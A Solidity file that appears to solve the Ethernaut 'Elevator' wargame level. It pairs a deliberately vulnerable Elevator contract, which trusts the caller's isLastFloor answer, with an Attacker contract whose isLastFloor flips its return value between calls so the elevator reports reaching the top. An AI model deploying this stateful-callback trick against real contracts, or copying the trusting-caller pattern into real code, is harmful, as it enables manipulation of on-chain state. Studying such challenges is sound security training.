// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Attacker {
    bool flip = true;
    Elevator elevator;
    
    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }
    
    function atk(uint floor) external {
        elevator.goTo(floor);
    }
    
    function isLastFloor(uint) external returns (bool) {
        flip = !flip;
        return flip;
    } 
    
}
